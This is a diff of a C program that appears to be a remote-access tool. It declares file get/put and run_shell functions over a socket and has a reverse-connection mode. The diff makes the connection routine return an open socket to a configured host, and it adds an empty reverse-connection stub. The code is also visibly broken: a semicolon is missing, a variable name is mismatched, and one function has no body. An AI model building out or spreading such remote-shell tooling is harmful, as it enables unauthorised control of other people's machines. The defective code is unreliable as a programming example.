@@ -12,23 +12,26 @@ void get_file(int sockfd, char *dest_path, char *sour_path);
 void put_file(int sockfd, char *dest_path, char *sour_path);
 void run_shell(int sockfd, char *shell_command);
 
-bool test_forward(){
+int test_forward(){
 	bool res = true;
 	int client;
 	struct sockaddr_in serv_addr;
 	if((client = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-		return false;
+		return -1;
 	memset(&serv_addr, 0, sizeof(servaddr))
 	serv_addr.sin_family = AF_INET;
 	serv_addr.sin_addr.s_addr = htonl(host);
 	serv_addr.sin_port = htons(port);
 	if(connect(client, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0)
-		res = false;
-	close(client);
-	return res;
+		return -1;
+	return client;
 }
 
-bool test_connection(){
+int test_reserve(){
+	
+}
+
+int test_connection(){
 	if(mode_of_work == REVERSECON)
 		return test_reserve();
 	else
@@ -50,6 +53,10 @@ void parse_command(){
 		opt_s[j] = command_line[i];
 	}
 	//exception handling;
+}
+
+int create_con(){
+	return test_connection();
 }
 
 bool exec_command(){
